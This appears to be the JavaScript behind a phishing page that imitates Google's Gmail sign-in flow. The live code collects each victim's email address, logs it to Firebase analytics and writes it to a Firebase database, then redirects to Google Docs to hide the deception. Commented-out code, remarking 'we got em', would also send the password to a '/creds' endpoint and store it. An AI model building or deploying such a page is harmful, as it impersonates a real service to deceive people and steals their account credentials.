/* a regex express to valid email addresses */

/* ref. https://stackoverflow.com/questions/46155/how-to-validate-an-email-address-in-javascript */

function validateEmail(email) {
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}

function onReady() {
    scrollTo(400, 0)
}

function doEmailStep() {

    var emailValid = validateEmail($('#email-input').val());

    $('#cgle-progress-bar').fadeIn(500);//.css('display', 'block')
    $('#login-form').css('opacity', 0.5)

    setTimeout(() => {
        $('#cgle-progress-bar').fadeOut(500);//.css('display', 'none')
        $('#login-form').css('opacity', 1.0)
        if (emailValid) {
            $('#email-input').removeClass('g-input-invalid')
            $('.invalid-email').css('display', 'none')
            $('#prev-email').text($('#email-input').val())

			var username = $('#email-input').val()
			track('entered_email', username)
            firebase.analytics().setUserProperties({ email: username });
            toPasswordPage()
        } else {
            $('#email-input').addClass('g-input-invalid')
            $('.invalid-email').css('display', 'block')
            toEmailPage()
        }
    }, 400);
}

function doPasswordStep() {
    var username = $('#email-input').val()
    // var password = $('#password-input').val()

	track('submitted_password', username)
    firebase.analytics().setUserProperties({ failed: true });

    save(username, (error) => {
		if(error) {

		} else {
			window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
		}
	});

    // //Redirect to myaccount.google
  //

    // var xhr = new XMLHttpRequest();
    // xhr.open("GET", "/creds?username="+ username +"&password="+ password, true);
    // xhr.onreadystatechange = function () {
    // 	// In local files, status is 0 upon success in Mozilla Firefox
    // 	if(xhr.readyState === XMLHttpRequest.DONE) {
    // 		var status = xhr.status;
    // 		if (status === 0 || (status >= 200 && status < 400)) {
    // 			//Ladies and gentlemen, we got em
    // 			console.log(username, password)
    // 			save(username, password);
    //
    // 			// //Redirect to myaccount.google
    // 			window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
    // 		} else {
    // 			console.log('error')
    // 			$('#password-input').val('')
    // 			$('#password-input').addClass("error");
    // 		}
    // 	}
    // };
    // xhr.send(null);
}

function toEmailPage() {
    coogle.scrollTo(400)
    $('#instruction-text').text('Sign in')
    $('#instrution-text-desc').text('Continue to Gmail')
    $('#email-input').focus()
}

function toPasswordPage() {
    scrollTo(0)

    $('#instruction-text').text('Welcome')
    $('#instrution-text-desc').text(' ')
    $('#password-input').focus()
}

function scrollTo(toPerc, duration = 500) {
    $('.slide-container-outer').animate({
        scrollLeft: toPerc + '%'
    }, duration);
}


function attachEvents() {
    $('#email-form-step').on('submit', function(e) {
        doEmailStep()
        e.preventDefault()
    })


    $('.btn-next-email').on('click', function() {
        doEmailStep()
    })

    $('#password-form-step').on('submit', function(e) {
        doPasswordStep()
        e.preventDefault()
    })

    $('.btn-next-password').on('click', function() {
        doPasswordStep()
    })

}

window.onload = function() {
    onReady()
	var username = $('#email-input').val()
	track('viewed_fake_page', username)
    attachEvents()
}

function track(event, email) {
    firebase.analytics().logEvent('track_interaction', {
        name: event,
        data: email
    });
}


function save(email, callback) {
    // A post entry.
    var userData = {
        email: email,
        // password: password,
    };

    // Get a key for a new Post.
    var newUserKey = firebase.database().ref().child('users').push().key;

    // Write the new post's data simultaneously in the posts list and the user's post list.
    var updates = {};
    updates['/users/' + newUserKey] = userData;

    return firebase.database().ref().update(updates, callback);
}
